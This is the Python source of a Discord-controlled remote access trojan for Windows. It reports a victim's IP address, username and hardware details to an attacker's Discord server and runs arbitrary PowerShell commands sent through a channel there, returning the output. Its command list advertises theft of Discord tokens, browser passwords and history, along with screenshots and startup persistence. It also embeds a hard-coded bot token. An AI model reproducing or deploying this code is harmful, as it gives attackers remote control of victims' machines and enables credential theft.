import os, subprocess, requests, re, json, base64, shutil, sqlite3, winreg, configparser
from Crypto.Cipher import AES
from datetime import datetime
from discord import *
import discord

APPDATA = os.getenv("APPDATA")
LOCALAPPDATA = os.getenv("LOCALAPPDATA")
TEMP = os.getenv("TEMP")
CWD = os.getcwd
guild_id = "1178260611428266034"
token = "MTE3ODI2MzA5ODI4OTgxOTY0OQ.GUDEZ0.8ovXIThf9HgbZ__1fTRHkyc_7uApMrTBPUtIn8"

def get_processor():
    stdout = subprocess.Popen(
        ["powershell.exe", "Get-WmiObject -Class Win32_Processor -ComputerName. | Select-Object -Property Name"], stdout=subprocess.PIPE, shell=True
    ).stdout.read().decode()
    return stdout.split("\n")[3]

def get_gpu():
    stdout = subprocess.Popen(
        ["powershell.exe", "Get-WmiObject -Class Win32_VideoController -ComputerName. | Select-Object -Property Name"], stdout=subprocess.PIPE, shell=True
    ).stdout.read().decode()
    return stdout.split("\n")[3]

def get_os():
    stdout = subprocess.Popen(
        ["powershell.exe", "Get-WmiObject -Class Win32_OperatingSystem -ComputerName. | Select-Object -Property Caption"], stdout=subprocess.PIPE, shell=True
    ).stdout.read().decode()
    return stdout.split("\n")[3]

intents = discord.Intents.all()
bot = discord.Client(intents=intents)
session_id = os.urandom(8).hex()
commands = "\n".join([
    "help - Help command",
    "ping - Ping command",
    "cwd - Get current working directory",
    "cd - Change directory",
    "ls - List directory",
    "download <file> - Download file",
    "upload <link> - Upload file",
    "shell - Execute shell command",
    "run <file> - Run an file",
    "exit - Exit the session",
    "screenshot - Take a screenshot",
    "tokens - Get all discord tokens",
    "passwords - Extracts all browser passwords",
    "history - Extracts all browser history",
    "startup <name> - Add to startup",
])

@bot.event
async def on_ready():
    guild = bot.get_guild(int(guild_id))
    channel = await guild.create_text_channel(session_id)
    ip_address = requests.get("https://api.ipify.org").text
    embed = discord.Embed(title="New session created", description="", color=0xfafafa)
    embed.add_field(name="Session ID", value=f"```{session_id}```", inline=True)
    embed.add_field(name="Username", value=f"```{os.getlogin()}```", inline=True)
    embed.add_field(name="🛰️  Network Information", value=f"```IP: {ip_address}```", inline=False)
    sys_info = "\n".join([
        f"OS: {get_os()}",
        f"CPU: {get_processor()}",
        f"GPU: {get_gpu()}"
    ])
    embed.add_field(name="🖥️  System Information", value=f"```{sys_info}```", inline=False)
    embed.add_field(name="🤖  Commands", value=f"```{commands}```", inline=False)
    await channel.send(embed=embed)

@bot.event
async def on_message(message):
    if message.author == bot.user:
        return

    if message.channel.name != session_id:
        return

    if message.content.startswith("/shell"):
        command = message.content[7:]
        output = subprocess.Popen(["powershell.exe", command],
                                stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                stdin=subprocess.PIPE, shell=True
                              ).communicate()[0].decode("utf-8")
        if output == "" or output == "None":
            output = "No output"
        else:
            open(f"{TEMP}\\output.txt", "w").write(output)
            embed = discord.Embed(title=f"Shell > {CWD}", description="```See attachment```", color=0xfafafa)
            file = discord.File(f"{os.getenv('TEMP')}\\output.txt")
            return await message.reply(embed=embed, file=file)
        embed = discord.Embed(title=f"Shell > {os.getcwd()}", description=f"```{output}```", color=0xfafafa)
        await message.reply(embed=embed)
